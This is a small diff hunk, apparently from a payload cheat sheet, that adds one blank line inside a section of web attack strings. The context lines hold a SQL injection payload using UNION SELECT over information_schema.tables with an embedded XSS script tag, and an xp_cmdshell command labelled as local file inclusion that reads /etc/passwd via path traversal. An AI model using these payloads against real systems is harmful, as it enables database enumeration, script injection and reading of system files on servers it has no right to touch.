@@ -65,6 +65,7 @@ SQL Injection:
 itsec-hb-token=adminlogin&mglS=2151+AND+1=1+UNION+ALL+SELECT+1,NULL,'<script>alert("XSS")</script>',table_name+FROM+information_schema.tables+WHERE+2>1--/**/;
 ```
 Local File Inclusion:
+
 ``
 EXEC+xp_cmdshell('cat+../../../etc/passwd')
 ``
